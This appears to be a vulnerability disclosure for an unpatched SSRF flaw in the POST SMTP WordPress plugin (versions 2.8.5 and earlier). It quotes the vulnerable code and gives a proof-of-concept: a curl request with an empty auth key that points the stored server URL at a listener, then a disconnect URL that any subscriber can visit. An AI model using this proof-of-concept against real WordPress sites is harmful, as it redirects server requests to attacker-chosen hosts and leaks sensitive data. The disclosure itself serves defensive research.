### POST-SMTP<= 2.8.5 smtp disconnect is vulnerable to SSRF causing sensitive data leak

- **Application**: POST-SMTP<= 2.8.5

- **Status**: Confirmed, not patched yet

- **Threat Impact**: Sensitive data leakage

- **Code**: Server URL is get from request header, then saved into database in `connect_app`. Then in `disconnect_app`, the server URL is retrieved back from database and used in sink function `wp_remote_post` as URL host.

  File: `Postman/Mobile/includes/rest-api/v1/rest-api.php`

  ```
  public function connect_app( WP_REST_Request $request ) {
    ...
    $server_url = $request->get_header( 'server_url' );
    ...
    update_option( 'post_smtp_server_url', $server_url );
  }
  
  function update_option( $option, $value, $autoload = null ) {
    ...
    $result = $wpdb->update( $wpdb->options, $update_args, array( 'option_name' => $option ) );
  }
  ```

  File: `Postman/Mobile/includes/controller/v1/controller.php`

  ```
  public function disconnect_app() {
    ...
    $server_url = get_option( 'post_smtp_server_url' );
    ...
    $response = wp_remote_post(
  					"{$server_url}/disconnect-app",
    ...
  				);
  }
  ```

- **POC**:

  1. Listen on 8888 on server side

  2. Send the following curl request to set the server

     ```
     curl --location --request POST 'http://test-server/wp-json/post-smtp/v1/connect-app' \
     --header 'auth-key;' \
     --header 'server-url: http://127.0.0.1:8888' \
     --header 'fcm-token: bbbb'
     ```

  3. Login (subscriber is also ok), visit `http://test-server/wp-admin/admin.php?action=post_smtp_disconnect_app&auth_token=bbbb`

  4. Receive a request on server side. 
